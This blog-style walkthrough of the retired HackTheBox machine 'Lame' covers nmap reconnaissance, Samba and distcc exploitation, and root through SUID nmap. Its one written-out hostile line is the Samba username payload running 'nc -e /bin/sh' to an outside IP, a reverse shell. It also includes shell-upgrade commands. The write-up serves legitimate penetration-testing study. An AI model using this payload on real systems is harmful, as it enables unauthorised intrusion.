---
title: Lame - HackTheBox Walkthrough
date: 2021-10-05 12:00:00 
categories: [HackTheBox,Linux]
tags: [smb,distcc,sudo]
img_path: /assets/img/HTB/Lame/
image: 
  path: 00-banner.png
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Lame` a retired machine by HackTheBox. Without further ado, let’s begin.

# Recon

## Nmap

As always, we'll start with a nmap scan to discover the open ports and services.

![01-nmap](01-nmap.png)

Let's start the FTP enumeration, but before we will run a complete nmap scan in the background to make sure we covered all ports.

![02-nmap](02-nmap.png)

The new port that we get is 3632 running distccd service, this could be interesting later.

## FTP

FTP allows anonymous login but the directory is empty.
Searching the version of it using `searchsploit` we find that is vulnerable to a backdoor command execution.

![03-ftp](03-ftp.png)

This vulnerability conscist in open a backdoor on the port 6200 when the attacker send a string that contains this characters `:)` as the username and nmap has a script to test it.

![04-backdoor](04-backdoor.png)

It looks that is not vulnerable.

## Samba

The next interesting service to enumerate is Samba, but for this occasion we must run smbclient with `--option="client min protocol=NT1"` as [argument](https://forum.hackthebox.com/t/psa-fix-to-smbv1-smbclient-issues/2351) to work with SMBv1 shares.

![05-smbclient](05-smbclient.png)

We can access to `tmp` directory but there’s nothing interesting in it.

![06-smbclient](06-smbclient.png)

Searching for if there any vulnerability in this version of samba we find a command execution.

![07-smb](07-smb.png)

# Exploitation #1 - Samba

Checking the [exploit](https://www.exploit-db.com/exploits/16320), It seems samba execute this command ``"/=` nohup nc -e /bin/sh 10.10.14.31 443`"`` when we login with that as username.

![08-revShell](08-revShell.png)

We are root!!

# Exploitation #2 - Distcc

If we remember the complete nmap scan it show us that there a service running on the port 3632, distcc. We can exploit a remote code execution vulnerability in this service using a [nmap script](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html) .

![09-distcc](09-distcc.png)

## Shell as daemon

So let's send a reverse shell.

![10-revShell](10-revShell.png)

To get a interactive shell just we must run the next commands.
```console
$ python -c 'import pty; pty.spawn("/bin/bash")'
$   ^Z
$ stty raw -echo;fg
$   reset
$ export TERM=xterm
$ export SHELL=bash
```
## Shell as root

As we see in the screenshot below nmap has SUID permissions.

![11-suid](11-suid.png)

Running [gtfoshell](https://github.com/Degr4ne/GTFOShell) to search on GTFOBins in terminal, we get the command to get a shell using nmap.

![13-root](13-root.png)
![12-gtfoshell](12-gtfoshell.png)

Voila!! We are root again.

Until next time.

